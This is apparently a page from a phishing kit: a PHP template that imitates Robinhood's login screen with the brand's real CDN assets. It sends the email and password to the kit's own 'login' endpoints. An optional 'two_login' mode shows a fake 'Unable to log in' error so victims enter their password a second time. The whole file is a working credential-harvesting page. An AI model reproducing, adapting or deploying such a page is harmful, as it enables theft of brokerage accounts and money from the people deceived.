<html lang="en-US" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<link rel="shortcut icon" href="img/167EWkdKrN2X6Jqp7LEO9o.ico">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/legacyStyles.8a7c8392c805eaaf82a4.css" type="text/css" media="all" data-id="legacy-styles">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/App.8a7c8392c805eaaf82a4.css" type="text/css" media="all">
<link rel="stylesheet" type="text/css" href="css/a.css">
<title>Log In | Robinhood</title>
</head>
<body class="theme-open-up">
<div id="react_root">
	<div>
		<div class="css-10d7enp">
			<div class="css-eyq2zi">
				<div class="css-17exwhe">
					<img aria-hidden="true" data-test-id="default-image" sizes="(min-width: 768px) 1440px, 720px" src="https://cdn.robinhood.com/assets/generated_assets/1e23d6b90f0d905b425ea289de345ab1.jpg" srcset="https://cdn.robinhood.com/assets/generated_assets/1e23d6b90f0d905b425ea289de345ab1.jpg 720w, https://cdn.robinhood.com/assets/generated_assets/632fcb3e7ed928b2a960f3e003d10b44.jpg 1440w" class="css-1ox8jnp">
					<div class="css-17gd2ko">
						<div class="css-slob1f">
							<div>
								<?php
								if ($two_login == "on") {
								  if (!isset($_POST['email'])) {
								?>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST"  action="login">
								<?php }else{ ?>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST"  action="account/login">
								<?php } } ?>
									<input type="hidden" name="akseskey" value="<?= $random; ?>">
									<header class="css-240zvz"><span class="css-1wyk9uc">Welcome to Robinhood</span></header>
									<div class="css-16x6d1u">
										<div>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9">
													<span class="css-ktio0g">Email or username</span>
												</div>
												<div class="css-p5k2s1">
													<input aria-describedby="" autocapitalize="off" autocomplete="off" autocorrect="off" name="email" required="" spellcheck="false" aria-invalid="false" class="remove-legacy css-1ur67ge" type="email" value="" autofocus></div>
												</label>
											</div>
											<div class="css-17nqzf1">
												<label class="css-8atqhb">
												<div class="css-1te2hl9">
													<span class="css-ktio0g">Password</span>
												</div>
												<div class="css-19gyy64">
													<input aria-describedby="" required="" aria-invalid="false" name="password" class="remove-legacy css-a4852m" type="password" value=""><button type="button" aria-label="show password in plain text" aria-pressed="false" aria-busy="false" class="css-755mzn">
													<div class="css-14ktbsh">
														<span class="css-gmuwbf"><span aria-hidden="true" class="css-1c6vscd"><svg fill="none" height="16" role="img" viewbox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M1 7.99996C1 7.99996 2.90909 3.54541 8 3.54541C13.0909 3.54541 15 7.99996 15 7.99996C15 7.99996 13.0909 12.4545 8 12.4545C2.90909 12.4545 1 7.99996 1 7.99996ZM5.77254 8.00002C5.77254 9.2282 6.77163 10.2273 7.99982 10.2273C9.228 10.2273 10.2271 9.2282 10.2271 8.00002C10.2271 6.77184 9.228 5.77275 7.99982 5.77275C6.77163 5.77275 5.77254 6.77184 5.77254 8.00002Z" fill="var(--rh__text-color)" fill-rule="evenodd"></path></svg></span></span>
													</div>
													</button>
												</div>
												</label>
											</div>
										</div>
										<p>
											<a tabindex="1" class="rh-hyperlink qD5a4psv-CV7GnWdHxLvn giCMwuScsy8yu1Cs9KDEO" rel="">Forgot your username or password?</a>
										</p>

										<div>
<?php
if ($two_login == "on") {
	if (isset($_POST['email'])) {
?>
<div class="_69VHCtVZwuwDirIVL0vhD zPyZmsoEi30X3b7ulwJa9" style="transition-duration: 250ms;">
<h4 class="_311oZ7RLN6n5KWY6Q21_rc">
<div class="_336VF-3Q48jM9ZaUFqhXEz">
<svg fill="none" height="16" role="img" viewbox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M8 2.5C4.97843 2.5 2.5 4.97843 2.5 8C2.5 11.0216 4.97843 13.5 8 13.5C11.0216 13.5 13.5 11.0216 13.5 8C13.5 4.97843 11.0216 2.5 8 2.5ZM1 8C1 4.15 4.15 0.999999 8 1C11.85 1 15 4.15 15 8C15 11.85 11.85 15 8 15C4.15 15 0.999999 11.85 1 8Z" fill="var(--rh__text-color)" fill-rule="evenodd"></path><path clip-rule="evenodd" d="M7.25 10V11.5H8.75V10H7.25ZM7.25 8.5L8.75 8.5L8.75 4.5H7.25V8.5Z" fill="var(--rh__text-color)" fill-rule="evenodd"></path></svg>
</div>
<div>
<span class="css-dq91k1">Unable to log in with provided credentials.</span>
</div>
</h4>
</div>
</div>
<?php } } ?>

										<p aria-live="assertive">
											<div class="_2QawT-EkOq7gIQN1hHcFqU" style="height: 0px; transition-duration: 300ms;">
												<div class="_3UC6vIw0Z8kgiibABGCPT2">
													<div></div>
												</div>
											</div>
										</p>
									</div>
									<footer class="css-tp596t">
									<div class="css-0">
										<button type="submit" class="_1OsoaRGpMCXh9KT8s7wtwm _2GHn41jUsfSSC9HmVWT-eg"><span class="css-1o0fjrg">Sign In</span></button>
									</div>
									</footer>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
</body>
</html>